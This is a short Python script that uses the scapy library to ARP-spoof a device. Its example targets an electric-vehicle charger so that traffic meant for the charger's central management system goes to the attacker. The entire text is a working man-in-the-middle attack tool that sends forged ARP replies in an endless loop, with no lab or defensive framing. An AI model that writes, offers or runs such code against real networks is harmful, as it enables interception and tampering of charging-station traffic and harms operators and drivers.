from scapy.all import ARP, Ether, send
import time

def arp_spoof(target_ip, spoof_ip, interface="eth0"):
    """
    Sends ARP responses to the target to associate the spoof IP with the attacker's MAC address.
    """
    attacker_mac = "XX:XX:XX:XX:XX:XX"  # Replace with your actual MAC address
    arp_response = ARP(pdst=target_ip, hwdst="ff:ff:ff:ff:ff:ff", psrc=spoof_ip, op=2)
    
    print(f"⚠️ Spoofing {target_ip} to believe {spoof_ip} is at {attacker_mac}")
    
    while True:
        send(arp_response, iface=interface, verbose=False)
        time.sleep(2)

# Example: Trick EVSE into sending packets to us instead of CSMS
evse_ip = "192.168.1.100"
csms_ip = "192.168.1.200"
arp_spoof(evse_ip, csms_ip)
